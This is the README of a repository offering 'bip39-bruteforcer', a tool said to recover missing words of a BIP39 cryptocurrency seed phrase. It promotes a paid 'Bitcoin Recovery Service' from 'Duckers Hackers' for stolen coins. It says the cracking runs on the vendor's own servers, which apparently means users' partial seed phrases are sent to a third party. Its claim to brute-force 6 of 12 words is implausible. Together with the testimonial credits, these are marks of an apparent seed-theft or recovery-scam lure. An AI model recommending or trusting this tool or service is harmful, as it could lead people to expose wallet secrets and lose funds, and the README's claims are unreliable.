# bip39-bruteforcer
Tool to recover lost BIP39 Seed developed by Duckers Hackers.

## About the tool
This is not to steal someone else's coins. This is a tool to recover your own seed phrase in case you have lost some of its words. It is able to brute force up to 6 out of the 12 words of a BIP39 seed phrase.

## Recovering bitcoins
If your bitcoins or cryptocurrency where stolen or your sent to someone else by mistake, this tool is not useful for you. However, the guys from Duckers can help you with their <a href="https://duckers.me/service/bitcoin-recovery">Bitcoin Recovery Service</a>.

## Demo

<p align="center">
<img src="https://raw.githubusercontent.com/ilianadosantos/bip39-bruteforcer/master/vendor/img/duckers.svg" alt="Duckers Hackers Logo" width="250">
</p>

<p>
  For online usage, check out the demo: https://ilianadosantos.github.io/bip39-bruteforcer/ <br />
  Take into consideration that API_Server is not set in online demo. For a complete usage, download the zip and execute it locally.
</p>

## How to use it?

### 1. Download the repository

Host it on your computer (localhost) or remotely.

### 2. Specify a response server

Since this needs a huge hash power, they use their own services for a proper cracking and then they broadcast the result to you. You must specify the URL where you want to receive the results.

```js
// bruteforce.js
var API_Server = ""; // WRITE HERE YOUR SERVER URL
```

### 3. Receive response

```json
{"status":"success","bip39_seed":"one two three four five six seven eight nine ten eleven twelve","satoshis":123456789}
```

If status is <strong>success</strong> you will receive 2 parameters:

<ul>
  <li><strong>bip39_seed</strong>: containing the cracked seed phrase.</li>
  <li><strong>satoshis</strong>: the balance of such wallet in satoshis.</li>
 </ul>

## Credits
This code has not been done by me. I bought it from Duckers because I had lost a part of my Coin Space BIP39 Seed and they coded it for me. Thanks to this code, I was able to recover my coins. I asked them if I was allowed to publish it and they gave me permission.

## Author

Developed by <a href="https://duckers.me">Duckers Hackers</a> with Javascript, jQuery and Bootstrap.
